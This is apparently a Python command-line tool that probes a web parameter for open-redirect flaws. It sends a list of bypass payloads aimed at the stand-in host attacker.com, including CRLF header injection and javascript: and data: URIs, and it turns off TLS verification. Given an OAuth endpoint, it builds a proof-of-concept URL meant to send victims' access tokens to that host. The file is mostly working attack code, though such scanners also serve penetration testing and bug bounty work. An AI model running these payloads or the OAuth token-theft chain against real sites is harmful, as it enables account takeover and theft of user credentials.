#!/usr/bin/env python3
"""
open-redirect — open redirect finder + OAuth state-theft chain builder.

Tests URL-like parameters for open redirect conditions:
  1. Absolute redirect to attacker.com
  2. Protocol-relative //attacker.com
  3. Backslash bypass \\attacker.com
  4. URL-encoded slash %2Fattacker.com
  5. Parameter pollution (&url=attacker.com after legit value)
  6. Path traversal redirect (/../..///attacker.com)
  7. JavaScript scheme (javascript:alert(1))
  8. Data URI scheme
  9. Unicode/CRLF injection

Also builds an OAuth chain if --oauth-auth-url is provided:
  Detects if the redirect flows through an OAuth authorization endpoint
  and constructs a token-theft PoC.

Usage:
  open-redirect.py --url https://acme.com/login --param next
                   [--method GET] [--token Bearer_xxx]
                   [--oauth-auth-url https://acme.com/oauth/authorize]
                   [--json] [--out results.json]
  open-redirect.py --url https://acme.com/logout --param returnTo
Exit: 0 clean · 1 findings.
"""
import sys, re, json, time, ssl
from pathlib import Path
from urllib.request import urlopen, Request
from urllib.error import HTTPError

def arg(n, d=None):
    return sys.argv[sys.argv.index(n)+1] if n in sys.argv else d
def args_multi(n):
    vals = []
    for i,a in enumerate(sys.argv):
        if a == n and i+1 < len(sys.argv): vals.append(sys.argv[i+1])
    return vals
def flag(n): return n in sys.argv

ATTACKER = "attacker.com"

# (label, payload_template, detect_fn)
def make_payloads(param, base_domain=""):
    return [
        ("absolute",         f"https://{ATTACKER}/"),
        ("absolute_no_proto",f"http://{ATTACKER}/"),
        ("proto_relative",   f"//{ATTACKER}/"),
        ("backslash",        f"\\\\{ATTACKER}/"),
        ("backslash2",       f"//\\{ATTACKER}/"),
        ("encoded_slash",    f"%2F%2F{ATTACKER}/"),
        ("double_slash",     f"////{ATTACKER}/"),
        ("dot_dot",          f"../{ATTACKER}/"),
        ("open_param",       f"https://{base_domain}@{ATTACKER}/"),
        ("param_pollute",    f"https://{base_domain}&{param}={ATTACKER}/"),
        ("javascript",       f"javascript:alert(1)"),
        ("data_uri",         f"data:text/html,<script>alert(1)</script>"),
        ("newline_inject",   f"%0d%0aLocation: https://{ATTACKER}/"),
        ("unicode_slash",    f"∕∕{ATTACKER}/"),
        ("crlf_redirect",    f"/%0d%0aLocation: https://{ATTACKER}/"),
    ]

def build_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    return ctx

def send_no_follow(url, method, headers, data, timeout=8):
    """Send request but do NOT follow redirects."""
    import urllib.request, http.client, urllib.parse
    ctx = build_ctx()
    # We need to intercept the redirect manually
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, hdrs, newurl): return None
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=ctx),
        NoRedirect()
    )
    req = Request(url, data=data, headers=headers, method=method)
    try:
        with opener.open(req, timeout=timeout) as r:
            body = r.read(2048).decode("utf-8","ignore")
            loc = r.headers.get("Location","")
            return r.status, loc, body
    except urllib.error.HTTPError as e:
        loc = e.headers.get("Location","")
        try: body = e.read(512).decode("utf-8","ignore")
        except: body = ""
        return e.code, loc, body
    except Exception as ex:
        return 0, "", str(ex)[:100]

def is_redirect(status): return status in (301,302,303,307,308)

def redirect_to_attacker(location):
    if not location: return False
    loc = location.lower()
    return ATTACKER.lower() in loc or "attacker" in loc

def extract_domain(url):
    m = re.search(r"https?://([^/?\#:]+)", url)
    return m.group(1) if m else ""

def build_inject_url(base_url, param, payload, method):
    import urllib.parse
    if method.upper() == "GET":
        sep = "&" if "?" in base_url else "?"
        return f"{base_url}{sep}{urllib.parse.quote(param, safe='')}={urllib.parse.quote(payload, safe=':/@#!')}"
    return base_url

def main():
    url         = arg("--url")
    param       = arg("--param")
    method      = arg("--method","GET").upper()
    token       = arg("--token")
    extra_h     = args_multi("--header")
    body_tpl    = arg("--data")
    oauth_url   = arg("--oauth-auth-url")
    out_file    = arg("--out")

    if not url or not param: print(__doc__); sys.exit(0)

    base_domain = extract_domain(url)
    headers = {"User-Agent":"Mozilla/5.0","Accept":"*/*"}
    if token: headers["Authorization"] = token if " " in token else f"Bearer {token}"
    for h in (extra_h or []):
        if ":" in h:
            k,v = h.split(":",1); headers[k.strip()] = v.strip()

    # baseline: send safe value, record status
    import urllib.parse
    safe_val = "https://example.com/"
    target_base = build_inject_url(url, param, safe_val, method)
    data = None
    if method != "GET":
        try: body = json.loads(body_tpl or "{}")
        except: body = {}
        body[param] = safe_val
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    base_status, base_loc, _ = send_no_follow(target_base, method, headers, data)
    print(f"[open-redirect] {method} {url} param={param} baseline={base_status} loc={base_loc[:60] if base_loc else '—'}", file=sys.stderr)

    payloads = make_payloads(param, base_domain)
    findings = []

    for label, payload in payloads:
        target = build_inject_url(url, param, payload, method)
        if method != "GET":
            try: body = json.loads(body_tpl or "{}")
            except: body = {}
            body[param] = payload
            data = json.dumps(body).encode()
        else:
            data = None
        status, loc, resp_body = send_no_follow(target, method, headers, data)
        if is_redirect(status) and redirect_to_attacker(loc):
            # confirmed open redirect
            sev = "medium"
            note = f"Open redirect confirmed: {param}={payload[:50]} → Location: {loc}"
            if "javascript" in payload or "data:" in payload:
                sev = "medium"
                note = f"XSS-via-redirect: {label} payload accepted in Location header"
            findings.append({
                "label": label,
                "payload": payload,
                "status": status,
                "location": loc,
                "severity": sev,
                "note": note,
            })
            print(f"  ✓ REDIRECT: {label} → {loc[:70]}", file=sys.stderr)

    # OAuth chain analysis
    if oauth_url and findings:
        # Check if the vulnerable URL is used as redirect_uri in OAuth flow
        # Look for redirect_uri / redirect_url param in oauth_url
        has_redir_param = bool(re.search(r"redirect_uri|redirect_url|callbackUrl", oauth_url, re.I))
        chain = {
            "oauth_url": oauth_url,
            "vulnerable_endpoint": url,
            "chain": f"OAuth authorization URL → redirect_uri={url}?{param}=https://{ATTACKER}/ → token stolen to attacker",
            "poc_url": f"{oauth_url}&redirect_uri={urllib.parse.quote(url+'?'+param+'=https://'+ATTACKER+'/', safe='')}",
            "severity": "high",
            "note": "If this redirect_uri is accepted, OAuth access token is exfiltrated to attacker.com",
        }
        findings.append(chain)

    result = {
        "ts": time.strftime("%Y-%m-%d %H:%M"),
        "url": url, "param": param,
        "total": len(findings),
        "high":   sum(1 for f in findings if f.get("severity")=="high"),
        "medium": sum(1 for f in findings if f.get("severity")=="medium"),
        "findings": findings,
    }
    if out_file: Path(out_file).write_text(json.dumps(result, indent=2))

    if flag("--json"):
        print(json.dumps(result)); sys.exit(1 if findings else 0)

    print(f"\n══ Open redirect · {url} ══════════════════════════")
    print(f"  Param: {param}  Findings: {len(findings)} (high: {result['high']} med: {result['medium']})")
    if findings:
        print()
        for f in findings:
            sev = f.get("severity","?").upper()
            print(f"  [{sev:<8}] {f.get('label','chain')}")
            print(f"             payload: {str(f.get('payload',''))[:70]}")
            if f.get("location"): print(f"             Location: {f['location'][:80]}")
            print(f"             {f['note'][:100]}")
    else:
        print("  No open redirect found.")

    sys.exit(1 if findings else 0)

if __name__ == "__main__":
    main()
